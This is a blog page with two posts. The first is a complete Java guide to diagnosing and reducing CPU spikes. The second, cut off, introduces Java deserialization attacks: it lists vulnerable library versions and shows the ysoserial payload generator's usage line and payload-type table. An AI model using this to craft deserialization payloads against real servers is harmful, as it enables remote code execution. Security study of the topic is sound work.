    <a href="/2022/11/21/2022-11/cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98%E9%80%9A%E7%94%A8%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF/" class="article-date">
  <time datetime="2022-11-21T03:45:19.000Z" itemprop="datePublished">2022-11-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/java/">java</a>►<a class="article-category-link" href="/categories/java/%E6%80%A7%E8%83%BD/">性能</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/11/21/2022-11/cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98%E9%80%9A%E7%94%A8%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF/">调优-cpu毛刺问题通用优化思路</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>工作中可能会遇到这么一种现象：<br>服务的cpu平均值不高，但是偶尔会有毛刺，也就是峰值高、均值低。</p>
<h1 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h1><p>这里需要分类讨论，从触发时机角度可以分3类：<br>A1。启动后可稳定复现；（或者大概率）<br>A2。启动时稳定复现；（或者大概率）<br>A3。无法稳定复现；</p>
<img src="/images/2022-11/a1_3.png" class="" width="800" height="1200" title="a1_3">


<p>从cpu峰值和流量大小的关系，则可以分2类:<br>B1: 峰值与流量大小无关;<br>B2: 峰值与流量大小有关;</p>
<img src="/images/2022-11/b1_2.png" class="" width="800" height="1200" title="b1_2">


<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>对于上一节中的几种分类现象，其实大致是从易到难排列的，解决方案依次有：</p>
<h2 id="A1，启动后稳定复现"><a href="#A1，启动后稳定复现" class="headerlink" title="A1，启动后稳定复现"></a>A1，启动后稳定复现</h2><p>也就是提供服务期间，某些特定请求会触发，例如之前遇到过的情况：<br><a href="http://xiaoyue26.github.io/2022/09/25/2022-09/%E8%B0%83%E4%BC%98-%E8%A7%A3%E5%86%B3%E7%BA%BF%E7%A8%8B%E6%B1%A0%E9%80%A0%E6%88%90%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8D%A1%E9%A1%BF%E3%80%81cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98/">http://xiaoyue26.github.io/2022/09/25/2022-09/%E8%B0%83%E4%BC%98-%E8%A7%A3%E5%86%B3%E7%BA%BF%E7%A8%8B%E6%B1%A0%E9%80%A0%E6%88%90%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8D%A1%E9%A1%BF%E3%80%81cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98/</a><br>这个时候可以使用<code>arthas</code>的<code>trace</code>命令，找出耗时长的代码链路：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">options unsafe true</span><br><span class="line">trace -E java.util.concurrent.CompletableFuture|java.lang.Thread supplyAsync|asyncSupplyStage|start  -n 1 --skipJDKMethod false '#cost &gt; 200'</span><br></pre></td></tr></table></figure>
<p>还可以使用<code>async-profiler</code>工具，打印火焰图，查看cpu使用率较高的调用栈,参考:<br><a href="http://xiaoyue26.github.io/2020/12/20/2020-12/%E7%BA%BF%E4%B8%8A%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E6%9F%A5%E7%9C%8B%E6%96%B9%E6%B3%95%E7%BA%A7%E8%80%97%E6%97%B6/">http://xiaoyue26.github.io/2020/12/20/2020-12/%E7%BA%BF%E4%B8%8A%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E6%9F%A5%E7%9C%8B%E6%96%B9%E6%B3%95%E7%BA%A7%E8%80%97%E6%97%B6/</a></p>
<h2 id="A2-启动时稳定复现"><a href="#A2-启动时稳定复现" class="headerlink" title="A2.启动时稳定复现"></a>A2.启动时稳定复现</h2><p>首先，A2类可以转化为A1类问题中的<code>async-profiler</code>解法来查看原因。<br>然后这类问题一般会发现是有些资源没有预热导致的，大致包括：<br>1。中间件类：mysql等框架组件;<br>2。缓存：如redis\内存缓存；<br>3。jit热点代码；(可以观察内存的<code>codeHeap</code>部分大小变化)</p>
<img src="/images/2022-11/jvm-cpu.png" class="" width="800" height="1200" title="jvm-cpu">


<p>解决方案主要是对外提供服务前，先预热好上述资源，大致方法包括：<br>1。启动时手动用代码调用相应接口，触发各种资源的加载；<br>2。对外提供服务前，先用<code>tcpcopy</code>之类的工具复制流量预热；<br>或者分阶段承接流量，先10%，再50%，再100%。<br>3。用阿里的<code>jwarmup</code>功能，用第一个实例的<code>jfr</code>文件，提供给其他实例触发编译,参考:<br><a href="https://developer.aliyun.com/ask/321147" target="_blank" rel="noopener">https://developer.aliyun.com/ask/321147</a></p>
<img src="/images/2022-11/jfr.png" class="" width="800" height="1200" title="jfr">

<ol start="4">
<li>升级jit编译器，改用<code>graal</code>。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:+UnlockExperimentalVMOptions -XX:+UseJVMCICompiler</span><br></pre></td></tr></table></figure>
或者如果是<code>codeHeap</code>满的问题，可以关掉flushing,增加size:<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:-UseCodeCacheFlushing -XX:ReservedCodeCacheSize=320M</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h2 id="A3-无法稳定复现"><a href="#A3-无法稳定复现" class="headerlink" title="A3.无法稳定复现"></a>A3.无法稳定复现</h2><p>对于偶发的cpu毛刺，确实比较麻烦，上次遇到了每1～3天只发生1次、时间无规律、也不一定出现在哪个容器上的情况，真是比较头疼。<br>这种情况比较难处理，只能进一步简化为每次发生的时候持续时间&gt;1s的情况。</p>
<p>基本解决思路是，启动一个后台进程，不断检查cpu占用情况，然后一旦发现cpu超限，就打印调用栈。<br>因为没搜到现成的工具，我手写了一个简单的python脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">pid = <span class="string">"136"</span> <span class="comment"># jps find it</span></span><br><span class="line">print(<span class="string">"start"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    top_info = subprocess.Popen([<span class="string">"top"</span>, <span class="string">"-H"</span>, <span class="string">"-p"</span>, pid, <span class="string">"-n"</span>, <span class="string">"1"</span>, <span class="string">"-b"</span>], stdout=subprocess.PIPE)</span><br><span class="line">    out, err = top_info.communicate()</span><br><span class="line">    out_info = out.decode(<span class="string">'unicode-escape'</span>)</span><br><span class="line">    line_list = out_info.split(<span class="string">'\n'</span>)</span><br><span class="line">    top_line = line_list[<span class="number">7</span>]</span><br><span class="line">    <span class="comment"># print(line_list[6])</span></span><br><span class="line">    <span class="comment"># print(top_line)</span></span><br><span class="line">    top_line = top_line.strip()</span><br><span class="line">    arr = re.split(<span class="string">'\s+'</span>, top_line)</span><br><span class="line">    <span class="comment"># print(arr)</span></span><br><span class="line">    cpu = float(arr[<span class="number">8</span>])</span><br><span class="line">    <span class="comment"># print(cpu)</span></span><br><span class="line">    thread_id = arr[<span class="number">0</span>]</span><br><span class="line">    nid = hex(int(thread_id))</span><br><span class="line">    <span class="comment"># print(nid)</span></span><br><span class="line">    nid_str = <span class="string">"nid="</span> + str(nid)</span><br><span class="line">    <span class="comment"># print(nid_str)</span></span><br><span class="line">    <span class="keyword">if</span> cpu &gt; <span class="number">50</span>:</span><br><span class="line">        print(time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>, time.localtime(time.time())))</span><br><span class="line">        print(cpu)</span><br><span class="line">        print(nid)</span><br><span class="line">        print(line_list[<span class="number">6</span>])</span><br><span class="line">        print(line_list[<span class="number">7</span>])</span><br><span class="line">        print(line_list[<span class="number">8</span>])</span><br><span class="line">        <span class="comment"># jstack -l &lt;pid&gt; | grep 'nid=0xd6b' -A 14</span></span><br><span class="line">        top_info = subprocess.Popen([<span class="string">"jstack"</span>, <span class="string">"-l"</span>, pid], stdout=subprocess.PIPE)</span><br><span class="line">        out, err = top_info.communicate()</span><br><span class="line">        out_info = out.decode(<span class="string">'unicode-escape'</span>)</span><br><span class="line">        out_arr = out_info.split(<span class="string">'\n'</span>)</span><br><span class="line">        total = len(out_arr)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(total):</span><br><span class="line">            line = out_arr[i]</span><br><span class="line">            <span class="keyword">if</span> nid_str <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">                    print(out_arr[i + j])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<p>启动命令:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nohup python -u debug.py &gt; jvm-debug.log 2&gt;&amp;1 &amp;</span><br><span class="line">echo $! &gt; nohup.pid</span><br><span class="line">tail -fn 100 jvm-debug.log</span><br></pre></td></tr></table></figure>
<p>放到容器里，跟踪个几天，才能跟踪到异常时的栈。</p>
<p>或者也可以简单top监控:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 只看rpc进程的各线程cpu分布:(可以修改RpcServerModularStarter部分来锁定自己的进程)</span></span><br><span class="line">nohup top -b -d 2 -n 2592000 -H -p $(pgrep -d',' -f RpcServerModularStarter) | grep 'top ' -A 30  &gt;&gt; top.log 2&gt;&amp;1 &amp;</span><br><span class="line">echo $! &gt; nohup2.pid</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 看机器上所有进程的cpu分布:</span></span><br><span class="line">nohup top -bc -d 2 -n 2592000 &gt;&gt; top.log 2&gt;&amp;1 &amp;</span><br><span class="line">echo $! &gt; nohup.pid</span><br><span class="line"></span><br><span class="line">tail -fn 100 top.log</span><br></pre></td></tr></table></figure>

<h3 id="graal编译器"><a href="#graal编译器" class="headerlink" title="graal编译器"></a>graal编译器</h3><p>有时候遇到一种情况就是抓出来发现是C2编译cpu高:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"C2 CompilerThread0" #6 daemon prio=9 os_prio=0 cpu=778138.42ms elapsed=64477.22s tid=0x00007fce3a2ba600 nid=0xa4 runnable  [0x0000000000000000]</span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line">   Compiling: 90064   !   4       java.net.URLClassLoader::findClass (47 bytes)</span><br></pre></td></tr></table></figure>

<img src="/images/2022-11/c2.png" class="" width="800" height="1200" title="c2">

<p>这种时候如果jdk版本&gt;=8，可以考虑换成<code>graal</code>编译器。<br>当然大方向上有几个思路:<br>1.C2 cpu占用高，那可以减少c2的线程数(<code>-XX:CICompilerCount</code>);<br>(如果已经是2，c1和c2各占1个线程，那就无法再低了,也可以参考B1调整)<br>2.直接把C2关了，只用C1: <code>-XX:TieredStopAtLevel=3</code>;<br>这个非常激进，影响很大，启动会很慢，平时性能也会下降；不到万不得已不用。<br>3.提前录制JFR，启动时编译(jwarmup);<br>4.升级到<code>graal</code>编译器。</p>
<p>对于第四点，为什么有用呢，有以下几个原因:<br>定性得看，c2编译器从jdk8以后就不维护升级了，因为它是C++写的，作者表示不维护也不会升级了，其他人改它的可能性微乎其微。<br>而graal是新一代编译器，java写的，还在活跃，C2里有的优化会往graal搬，反之则不会。所以定性地看graal天然就有优势。<br>定量的看，graal有几个场景下的新优化：<br>1.使用了lambda表达式、虚函数、java以外的语言（scala,groovy,kotlin）的场景:<br>C2对于没法直接知道调用点地址的，没有进一步做内联；<br>而graal会去比较类代码地址，然后内联，所以对于上述场景也会内联，会更优化；</p>
<p>2.部分逃逸场景：<br>C2只处理完全不逃逸，graal则对于部分逃逸情况的对象也进行优化，进行栈上分配。<br>（栈上分配，实际实现是标量替换，直接把这个对象的所有字段展开、在栈上创建）。<br>比如一个对象如果仅在单个方法内（栈封闭），其实就是这个对象不会逃逸出这个线程的使用，不会并发，可以直接栈上分配，不用去堆。<br>而部分逃逸就是可能99%的情况是不逃逸的，只有1%的情况逃逸;graal可以推迟对象的创建，这样99%的情况可以栈上分配。</p>
<p>3.支持SIMD的CPU:<br>C2主要考虑循环展开，而graal会倾向于用向量化指令来优化，因此如果是支持SIMD的cpu,graal可能会有优势。<br>graal当然不只上述几个优化点（锁消除、数据流分析等），仅列举了几个比较好理解的，有兴趣可以搜素或者看参考资料中的链接。</p>
<p>如果要探究究竟编译了什么代码，可以打开jit日志，然后用jitwatch查看日志（或者直接自己肉眼parse看）：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:+UnlockDiagnosticVMOptions -XX:+PrintCompilation -XX:+PrintInlining -XX:+PrintCodeCache -XX:+PrintCodeCacheOnCompilation -XX:+TraceClassLoading -XX:+LogCompilation -XX:LogFile=jit.log</span><br></pre></td></tr></table></figure>


<h2 id="B1-cpu峰值与流量大小无关"><a href="#B1-cpu峰值与流量大小无关" class="headerlink" title="B1 cpu峰值与流量大小无关"></a>B1 cpu峰值与流量大小无关</h2><p>前面A1到A3都涉及到先定位原因，再解决问题。<br>如果时间紧迫，情况又是B1这种简单情况，其实可以考虑先简单改下基础配置来先临时顶一下。后续再慢慢考虑A1到A3优化。</p>
<p>比如如果我们cpu均值使用是20%、峰值是120%，根据监控，峰值（毛刺）部分出现的时机和流量大小无关；<br>并不是流量大的时候才会出现，这种时候，我们可以把容器的基础配置改改，升核数、降实例数：<br>before: 4核8GB x 16个<br>after:  8核16GB x 8个</p>
<p>修改后，cpu均值使用40%，峰值60%，就都处于安全区间了。</p>
<p>当然，如果cpu均值是25%，峰值是320%，差距过于大，调完变成均值100%、峰值100%(max(80%,100%))了，这种方法就无法使用了。</p>
<p>也可以考虑一些通用的优化，比如:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-XX:-PreserveFramePointer 关闭打调用栈用的存储来优化性能</span><br><span class="line">-XX:+UseLargePages</span><br><span class="line">-XX:+UseTransparentHugePages</span><br></pre></td></tr></table></figure>

<blockquote>
<p>-XX:-PreserveFramePointer类似于GCC的 -fomit-frame-pointer 选项，PreserveFramePointer选项会将函数调用的frame pointer保存至寄存器，给perf等基于backtrace获取完整调用堆栈的场景提供支持，但同时也额外多执行了一些指令，引入一定开销。<br>JVM自身提供的jvmti接口，可以在不依赖PreserveFramePointer的情况下，获取Java堆栈，构建在其之上的jstack、async-profiler(AsyncGetCallTrace) 等工具也都不依赖PreserveFramePointer.<br>鉴于 「使用native工具获取Java堆栈 」这种场景出现的频率低，而常用JVM诊断工具均不依赖此参数，可以考虑仅在有限环境下开启PreserveFramePointer</p>
</blockquote>
<h2 id="B2-cpu峰值与流量大小有关"><a href="#B2-cpu峰值与流量大小有关" class="headerlink" title="B2 cpu峰值与流量大小有关"></a>B2 cpu峰值与流量大小有关</h2><p>这种情况可能是高并发情况下触发了什么缺陷。<br>可以看看线程池的使用率，看看是哪个线程池飙升了，针对性进行优化业务代码。<br>或者可以通过压测或者分解成A1到A3的情况进行处理。</p>
<h2 id="进水排水缓解思路"><a href="#进水排水缓解思路" class="headerlink" title="进水排水缓解思路"></a>进水排水缓解思路</h2><p>如果实在抓不到原因，不明原因时的缓解手段：</p>
<img src="/images/2022-11/cpu-qos.png" class="" width="800" height="1200" title="cpu-qos">
<img src="/images/2022-11/cpu-water.png" class="" width="800" height="1200" title="cpu-water">
<p>进水：源源不断的访问请求到来；<br>排水：处理请求；<br>水池：线程池排队队列；</p>
<h3 id="增加排水"><a href="#增加排水" class="headerlink" title="增加排水"></a>增加排水</h3><p>1.增加核数、处理线程数（无风险、有成本）；<br>2.根据超时时间，取消已超时的任务、线程（false无风险，true有一定风险）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法1. 可以用guava的包:</span></span><br><span class="line">ListenableFuture&lt;Object&gt; future = Futures.withTimeout(future1, <span class="number">1</span>, TimeUnit.SECONDS, SC_POOL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2. 手动cancel:</span></span><br><span class="line"><span class="comment">// 主调用的地方捕获超时异常:</span></span><br><span class="line"> <span class="keyword">catch</span> (TimeoutException e) &#123;</span><br><span class="line">            logger.warn(<span class="string">"ruleId &#123;&#125; timeout for userId: &#123;&#125;"</span>, ruleId, userId);</span><br><span class="line">            <span class="keyword">if</span> (TASK_CANCEL.get() &amp;&amp; allowCancel) &#123;</span><br><span class="line">                checkFuture.cancel(<span class="keyword">true</span>); <span class="comment">// true: 需要底层对于中断是安全的,有一定风险; false: 仅取消未运行</span></span><br><span class="line">            &#125;</span><br><span class="line">            perf(<span class="string">"csc.center.rule"</span>, <span class="string">"timeout/"</span> + ruleId).logstash();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            checkFuture.cancel(<span class="keyword">true</span>);</span><br><span class="line">            perf(<span class="string">"csc.center.rule"</span>, <span class="string">"interrupt/"</span> + ruleId).logstash();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 提交的任务也要捕获中断:</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">//noinspection ConstantConditions</span></span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> InterruptedException) &#123;</span><br><span class="line">                    perf(CscInfraExecutorImpl.PERF_NS, <span class="string">"/interrupt"</span>, <span class="keyword">var</span>.getVarKey(), <span class="keyword">var</span>.getVarId()).logstash();</span><br><span class="line">                    logger.debug(<span class="string">"InterruptedException: &#123;&#125;"</span>, <span class="keyword">var</span>.getVarKey());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> e;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="减少进水"><a href="#减少进水" class="headerlink" title="减少进水"></a>减少进水</h3><ol>
<li>rpc摘流（无损）;</li>
<li>qos(有损，部分降级):<br>对于不同主调区分QOS等级，优先处理核心请求（如路由、打标签）。</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://heapdump.cn/topic/UseLargePages" target="_blank" rel="noopener">https://heapdump.cn/topic/UseLargePages</a><br><a href="https://www.modb.pro/db/37684" target="_blank" rel="noopener">https://www.modb.pro/db/37684</a><br><a href="https://zhuanlan.zhihu.com/p/459695978" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/459695978</a><br><a href="https://martijndwars.nl/2020/02/24/graal-vs-c2.html" target="_blank" rel="noopener">https://martijndwars.nl/2020/02/24/graal-vs-c2.html</a><br><a href="https://mp.weixin.qq.com/s/7PH8o1tbjLsM4-nOnjbwLw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/7PH8o1tbjLsM4-nOnjbwLw</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/11/21/2022-11/cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98%E9%80%9A%E7%94%A8%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF/" data-id="claqgudlw0000lwambzie6r8g" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/graal/" rel="tag">graal</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jit/" rel="tag">jit</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-10/java反序列化攻击-md" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/10/03/2022-10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB-md/" class="article-date">
  <time datetime="2022-10-03T08:56:48.000Z" itemprop="datePublished">2022-10-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a>►<a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/10/03/2022-10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB-md/">java反序列化攻击</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="WHAT-反序列化攻击是什么"><a href="#WHAT-反序列化攻击是什么" class="headerlink" title="WHAT: 反序列化攻击是什么?"></a>WHAT: 反序列化攻击是什么?</h1><p>有些应用可能会把对象序列化成bytes(或者字符串)，然后再反序列化回对象。<br>这个过程中，如果用户能修改序列化后的字符串（或者bytes），就可能注入恶意的代码，从而控制目标机器。</p>
<p>以java为例，可能应用会用<code>writeObject</code>序列化对象成bytes，<br>然后<code>readObject</code>反序列化回对象。如果应用中有这部分逻辑，就得提防反序列化漏洞了。</p>
<h1 id="HOW-怎么构造一个反序列化攻击"><a href="#HOW-怎么构造一个反序列化攻击" class="headerlink" title="HOW: 怎么构造一个反序列化攻击"></a>HOW: 怎么构造一个反序列化攻击</h1><p>除了<code>commons-collections 3.1</code>可以用来利用java反序列化漏洞，还有更多第三方库同样可以用来利用反序列化漏洞并执行任意代码，部分如下：</p>
<blockquote>
<p>commons-fileupload 1.3.1<br>commons-io 2.4<br>commons-collections 3.1<br>commons-logging 1.2<br>commons-beanutils 1.9.2<br>org.slf4j:slf4j-api 1.7.21<br>com.mchange:mchange-commons-java 0.2.11<br>org.apache.commons:commons-collections 4.0<br>com.mchange:c3p0 0.9.5.2<br>org.beanshell:bsh 2.0b5<br>org.codehaus.groovy:groovy 2.3.9</p>
</blockquote>
<h2 id="使用工具构造payload"><a href="#使用工具构造payload" class="headerlink" title="使用工具构造payload"></a>使用工具构造payload</h2><p>可以使用ysoserial: <a href="https://github.com/search?q=ysoserial" target="_blank" rel="noopener">https://github.com/search?q=ysoserial</a><br>在已知目标程序依赖了哪些有漏洞的库的前提下，选择对应类型来生成payload:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'</span><br><span class="line">  Available payload types:</span><br><span class="line">九月 29, 2022 6:36:29 下午 org.reflections.Reflections scan</span><br><span class="line">信息: Reflections took 182 ms to scan 1 urls, producing 18 keys and 153 values</span><br><span class="line">     Payload             Authors                                Dependencies</span><br><span class="line">     -------             -------                                ------------</span><br><span class="line">     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2</span><br><span class="line">     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5</span><br><span class="line">     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11</span><br><span class="line">     Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0</span><br><span class="line">     Clojure             @JackOfMostTrades                      clojure:1.8.0</span><br><span class="line">     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2</span><br><span class="line">     CommonsCollections1 @frohoff                               commons-collections:3.1</span><br><span class="line">     CommonsCollections2 @frohoff                               commons-collections4:4.0</span><br><span class="line">     CommonsCollections3 @frohoff                               commons-collections:3.1</span><br><span class="line">     CommonsCollections4 @frohoff                               commons-collections4:4.0</span><br><span class="line">     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1</span><br><span class="line">     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1</span><br><span class="line">     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1</span><br><span class="line">     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4</span><br><span class="line">     Groovy1             @frohoff                               groovy:2.3.9</span><br><span class="line">     Hibernate1          @mbechler</span><br><span class="line">     Hibernate2          @mbechler</span><br><span class="line">     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     JRMPClient          @mbechler</span><br><span class="line">     JRMPListener        @mbechler</span><br><span class="line">     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1</span><br><span class="line">     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     Jdk7u21             @frohoff</span><br><span class="line">     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2</span><br><span class="line">     MozillaRhino1       @matthias_kaiser                       js:1.7R2</span><br><span class="line">     MozillaRhino2       @_tint0                                js:1.7R2</span><br><span class="line">     Myfaces1            @mbechler</span><br><span class="line">     Myfaces2            @mbechler</span><br><span class="line">     ROME                @mbechler                              rome:1.0</span><br><span class="line">     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE</span><br><span class="line">     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2</span><br><span class="line">     URLDNS              